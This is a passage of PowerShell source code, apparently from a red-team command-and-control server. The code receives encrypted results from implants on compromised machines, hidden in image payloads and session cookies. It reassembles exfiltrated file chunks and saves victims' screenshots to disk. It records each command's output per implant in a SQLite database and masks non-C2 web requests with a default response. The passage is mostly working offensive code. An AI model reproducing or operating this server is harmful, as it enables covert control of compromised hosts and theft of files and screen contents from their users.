            $size2 = $len -1
            $buffer = New-Object byte[] $size
            $targetStream.Position = 0
            $targetStream.Read($buffer, 0, $targetStream.Length)|Out-null

            $targetStream.Flush()
            $targetStream.Close() 
            $targetStream.Dispose()

            # if you want to look at the image that is transfered back each time :)
            # [io.file]::WriteAllBytes("$global:newdir\TempHeuristicImage.png", $Buffer)
            $encryptedString = $buffer[1500..$size2]
            $cookiesin = $request.Cookies -replace 'SessionID=', ''
            $cookieplaintext = Decrypt-String $key $cookiesin          
  
            # if the task was to download a file, dump it directly to disk
            if  ($cookieplaintext.tolower().startswith('download-file'))
            {
                try {
                    $filebytes = Decrypt-Bytes $key $encryptedString
                    $file = $cookieplaintext -replace "download-file ",""
                    $ramdomfilename = Get-RandomURI -Length 5
                    $targetfile = "$global:newdir\downloads\$($file)"
                    [int]$chunkNumber = [System.Text.Encoding]::UTF8.GetString($filebytes[0..4])
                    [int]$totalChunks = [System.Text.Encoding]::UTF8.GetString($filebytes[5..9])
                    $filebytes = $filebytes[10..($filebytes.Length)]
                    $wStream = new-object IO.FileStream $targetfile, ([System.IO.FileMode]::Append), ([IO.FileAccess]::Write), ([IO.FileShare]::Read)
                    $wStream.Write($filebytes, 0, $filebytes.Length)
                    $wStream.Close()
                    $backToPlainText = "Downloaded file part $($chunkNumber) of $($totalChunks) : $targetfile 123456<>654321"
                    if ($null -ne $br -and $br -is [System.IDisposable])
                    {
                        $br.Dispose()
                    }
                } catch {
                    Echo $error[0]
                    Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
                    $backToPlainText = "File not downloaded, the size could be too large or the user may not have permissions!"
                }
            } else {           
                try {
                    $backToPlainText = Decrypt-String2 $key $encryptedString
                }
                catch{             
                    $backToPlainText = "Unable to decrypt message from host"
                    $error.clear()
                    $cookieplaintext = "Unable to decrypt message from host: $cookieplaintext. Could be too large and truncating data!"
                }
            }
            
            # if the task was a screenshot, dump it directly to disk
            if ($cookieplaintext.tolower().startswith('get-screenshot'))
            {
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                try{
                    $randomimageid = Get-RandomURI -Length 15
                    $imagepath = "$global:newdir\downloads\$randomimageid.png"
                    #Convert Base64 to Image
                    $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
                    $imageBytes = [Convert]::FromBase64String($backToPlainText)
                    $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
                    $ms.Write($imageBytes, 0, $imageBytes.Length)
                    $image = [System.Drawing.Image]::FromStream($ms, $true)
                    $image.Save("$imagepath")
                    $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
                }
                catch {
                    $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
                    Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
                }
                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
            }

            if ($backToPlainText -match '123456(.+?)654321')
            {$cmdlineinput = $matches[1]}
            $Query = 'INSERT
                INTO CompletedTasks (TaskID, RandomURI, Command, Output, Prompt)
            VALUES (@TaskID, @RandomURI, @Command, @Output, @Prompt)'

            Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                TaskID    = (Get-Date)
                RandomURI = "$ranuri"
                Command   = $cookieplaintext
                Output    = $backToPlainText -replace '123456(.+?)654321', ''
                Prompt    = $cmdlineinput
            }|out-null
            $message = "     "
        }
    }
    }

    # if a web request comes in that is not for the c2 server, send default 404 response
    if (!$message) {
        $message = $httpresponse
        Write-Output (Get-Date) | Out-File $global:newdir\Webserver.log -Append
        Write-Output $request | Out-File $global:newdir\Webserver.log -Append
    }

    if ($exe) {
        $buffer = $message
        $exe = $false
    } else {
        [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    }

    $response.ContentLength64 = $buffer.length
    $response.StatusCode = 200
    $response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    $response.Headers.Add("Pragma", "no-cache")
    $response.Headers.Add("Expires", 0)
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
    $message = $null
    $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$taskiddb" -as PSObject

    if ($resultsdb)
    {
        $ranuri = $resultsdb.RandomURI
        $im_result = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
        $implanthost = $im_result.User
        $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
        $taskcompledtime = $resultsdb.TaskID
        $imID = $im_result.ImplantID
        $imHost = $im_result.Hostname
        $imDom = $im_result.Domain
        Write-Host "Command returned against implant $imID on host $imHost $imDom ($taskcompledtime)" -ForegroundColor Green
        Write-Host -Object $resultsdb.Output -ForegroundColor Green
        $taskiddb ++
    }

}

$listener.Stop()
}
